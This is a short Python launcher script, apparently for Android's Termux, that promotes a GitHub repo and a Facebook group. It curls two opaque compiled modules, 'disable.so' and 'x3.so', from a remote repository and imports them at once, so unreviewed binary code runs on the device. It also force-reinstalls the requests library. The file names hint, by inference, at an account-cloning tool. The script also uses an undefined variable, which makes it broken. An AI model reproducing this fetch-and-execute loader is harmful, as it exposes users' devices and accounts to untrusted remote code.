disabler_file = "disable.so"
file_clone_file = "x3.so"
import os
os.system("pkg install wget -y")
os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
def intro():
  print('give star to our repo')
  os.system('git pull && clear')
  os.system('xdg-open https://github.com/Ahmed-XD/FILE')
  print('Join Our Facebook Group and support us')
  os.system('xdg-open https://m.facebook.com/groups/1247184652736578/')
  os.system('clear')
  
def install_part(file_name):
  os.system(f"curl -L https://github.com/Ahmed-XD/library/blob/main/{file_name}?raw=true -o {file_name}")

if os.path.exists(disabler_file) and os.path.exists(file_clone_file) and os.path.exists(random_clone_file):
  os.remove(disabler_file)
  os.remove(file_clone_file)

intro()
install_part(disabler_file)
install_part(file_clone_file)
os.system("clear")

import disable
import x3

